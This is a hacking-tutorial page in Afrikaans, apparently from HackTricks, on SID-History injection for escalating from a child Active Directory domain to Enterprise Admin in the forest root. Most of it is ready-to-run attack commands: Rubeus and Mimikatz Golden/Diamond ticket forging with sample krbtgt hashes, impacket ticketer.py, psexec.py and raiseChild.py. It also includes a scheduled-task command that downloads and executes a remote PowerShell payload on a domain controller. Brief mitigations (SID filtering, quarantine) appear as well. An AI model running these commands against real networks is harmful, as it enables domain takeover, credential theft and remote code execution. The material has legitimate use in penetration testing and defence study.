# SID-History Injection

{{#include ../../banners/hacktricks-training.md}}

## SID History Injection Attack

Die fokus van die **SID History Injection Attack** is om **user migration between domains** te ondersteun terwyl voortgesette toegang tot hulpbronne vanaf die voormalige domein verseker word. Dit word bereik deur die gebruiker se vorige Security Identifier (SID) by die SID History van hul nuwe account in te sluit. Hierdie proses kan egter gemanipuleer word om ongemagtigde toegang toe te staan deur die SID van ’n groep met hoë privileges (soos Enterprise Admins of Domain Admins) vanaf die ouerdomein by die SID History te voeg. Hierdie uitbuiting verleen toegang tot alle hulpbronne binne die ouerdomein.<sup>[[1]](#references)[[2]](#references)</sup>

Twee metodes bestaan om hierdie aanval uit te voer: deur óf ’n **Golden Ticket** óf ’n **Diamond Ticket** te skep.

Om die SID vir die **"Enterprise Admins"**-groep te bepaal, moet ’n mens eers die SID van die worteldomein vind. Nadat dit geïdentifiseer is, kan die Enterprise Admins-groep se SID saamgestel word deur `-519` aan die worteldomein se SID te voeg. Byvoorbeeld, as die worteldomein se SID `S-1-5-21-280534878-1496970234-700767426` is, sal die resulterende SID vir die "Enterprise Admins"-groep `S-1-5-21-280534878-1496970234-700767426-519` wees.<sup>[[1]](#references)</sup>

Jy kan ook die **Domain Admins**-groepe gebruik, wat met **512** eindig.

Nog ’n manier om die SID van ’n groep in die ander domein (byvoorbeeld "Domain Admins") te vind, is met:
```bash
Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSid
```
> [!WARNING]
> Let daarop dat dit moontlik is om SID history in ’n trust relationship te deaktiveer, wat sal veroorsaak dat hierdie aanval misluk.

Volgens die [**docs**](https://technet.microsoft.com/library/cc835085.aspx):<sup>[[3]](#references)</sup>
- **Deaktiveer SIDHistory op forest trusts** met die netdom-tool (`netdom trust /domain: /EnableSIDHistory:no on the domain controller`)
- **Pas SID Filter Quarantining op external trusts toe** met die netdom-tool (`netdom trust /domain: /quarantine:yes on the domain controller`)
- **Die toepassing van SID Filtering op domain trusts binne ’n enkele forest** word nie aanbeveel nie, aangesien dit ’n unsupported configuration is en breaking changes kan veroorsaak. As ’n domain binne ’n forest onbetroubaar is, behoort dit nie ’n lid van die forest te wees nie. In hierdie situasie moet die trusted en untrusted domains eers in afsonderlike forests verdeel word, waarna SID Filtering op ’n interforest trust toegepas kan word.

Kyk na hierdie post vir meer inligting oor hoe om dit te bypass: [**https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4**](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)<sup>[[4]](#references)</sup>

### Diamond Ticket (Rubeus + KRBTGT-AES256)

Die laaste keer wat ek dit probeer het, moes ek die arg **`/ldap`** byvoeg.
```bash
# Use the /sids param
Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap /ldap

# Or a ptt with a golden ticket
## The /ldap command will get the details from the LDAP (so you don't need to put the SID)
## The /printcmd option will print the complete command if later you want to generate a token offline
Rubeus.exe golden /rc4:<krbtgt hash> /domain:<child_domain> /sid:<child_domain_sid>  /sids:<parent_domain_sid>-519 /user:Administrator /ptt /ldap /nowrap /printcmd

#e.g.

execute-assembly ../SharpCollection/Rubeus.exe golden /user:Administrator /domain:current.domain.local /sid:S-1-21-19375142345-528315377-138571287 /rc4:12861032628c1c32c012836520fc7123 /sids:S-1-5-21-2318540928-39816350-2043127614-519 /ptt /ldap /nowrap /printcmd

# You can use "Administrator" as username or any other string
```
### Golden Ticket (Mimikatz) with KRBTGT-AES256
```bash
mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid:<current_domain_sid> /sids:<victim_domain_sid_of_group> /aes256:<krbtgt_aes256> /startoffset:-10 /endin:600 /renewmax:10080 /ticket:ticket.kirbi" "exit"

/user is the username to impersonate (could be anything)
/domain is the current domain.
/sid is the current domain SID.
/sids is the SID of the target group to add ourselves to.
/aes256 is the AES256 key of the current domain's krbtgt account.
--> You could also use /krbtgt:<HTML of krbtgt> instead of the "/aes256" option
/startoffset sets the start time of the ticket to 10 mins before the current time.
/endin sets the expiry date for the ticket to 60 mins.
/renewmax sets how long the ticket can be valid for if renewed.

# The previous command will generate a file called ticket.kirbi
# Just loading you can perform a dcsync attack agains the domain
```
Vir meer inligting oor golden tickets, kyk na:


{{#ref}}
golden-ticket.md
{{#endref}}


Vir meer inligting oor diamond tickets, kyk na:


{{#ref}}
diamond-ticket.md
{{#endref}}
```bash
.\asktgs.exe C:\AD\Tools\kekeo_old\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local
.\kirbikator.exe lsa .\CIFS.mcorpdc.moneycorp.local.kirbi
ls \\mcorp-dc.moneycorp.local\c$
```
Eskaleer na DA van root of Enterprise admin deur die KRBTGT-hash van die gekompromitteerde domein te gebruik:
```bash
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-211874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'

Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\Tools\krbtgt_tkt.kirbi"'

gwmi -class win32_operatingsystem -ComputerName mcorpdc.moneycorp.local

schtasks /create /S mcorp-dc.moneycorp.local /SC Weekely /RU "NT Authority\SYSTEM" /TN "STCheck114" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"

schtasks /Run /S mcorp-dc.moneycorp.local /TN "STCheck114"
```
Met die verkrygde toestemmings van die aanval kan jy byvoorbeeld ’n DCSync-aanval in die nuwe domein uitvoer:


{{#ref}}
dcsync.md
{{#endref}}

### Vanaf Linux

#### Handmatig met [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py)
```bash
# This is for an attack from child to root domain
# Get child domain SID
lookupsid.py <child_domain>/username@10.10.10.10 | grep "Domain SID"
# Get root domain SID
lookupsid.py <child_domain>/username@10.10.10.10 | grep -B20 "Enterprise Admins" | grep "Domain SID"

# Generate golden ticket
ticketer.py -nthash <krbtgt_hash> -domain <child_domain> -domain-sid <child_domain_sid> -extra-sid <root_domain_sid> Administrator

# NOTE THAT THE USERNAME ADMINISTRATOR COULD BE ACTUALLY ANYTHING
# JUST USE THE SAME USERNAME IN THE NEXT STEPS

# Load ticket
export KRB5CCNAME=hacker.ccache

# psexec in domain controller of root
psexec.py <child_domain>/Administrator@dc.root.local -k -no-pass -target-ip 10.10.10.10
```
#### Outomaties met [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)

Dit is ’n Impacket-script wat die **eskalering van die kinderdomein na die ouerdomein outomatiseer**. Die script benodig:

- Teikendomeinbeheerder
- Aanmeldbesonderhede vir ’n admin-gebruiker in die kinderdomein

Die vloei is:

- Verkry die SID vir die Enterprise Admins-groep van die ouerdomein
- Haal die hash vir die KRBTGT-rekening in die kinderdomein op
- Skep ’n Golden Ticket
- Meld by die ouerdomein aan
- Haal aanmeldbesonderhede vir die Administrator-rekening in die ouerdomein op
- As die `target-exec`-switch gespesifiseer word, autentiseer dit by die ouerdomein se Domain Controller via Psexec.
```bash
raiseChild.py -target-exec 10.10.10.10 <child_domain>/username
```
## Verwysings

- [1] [Sneaky Active Directory Persistence #14: SID History - adsecurity.org](https://adsecurity.org/?p=1772)
- [2] [What is Security Identifier (SID)? - SentinelOne](https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/)
- [3] [Security Considerations for Trusts - Microsoft TechNet](https://technet.microsoft.com/library/cc835085.aspx)
- [4] [itm8.com - Sid Filter As Security Boundary Between Domains Part 4](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)

{{#include ../../banners/hacktricks-training.md}}
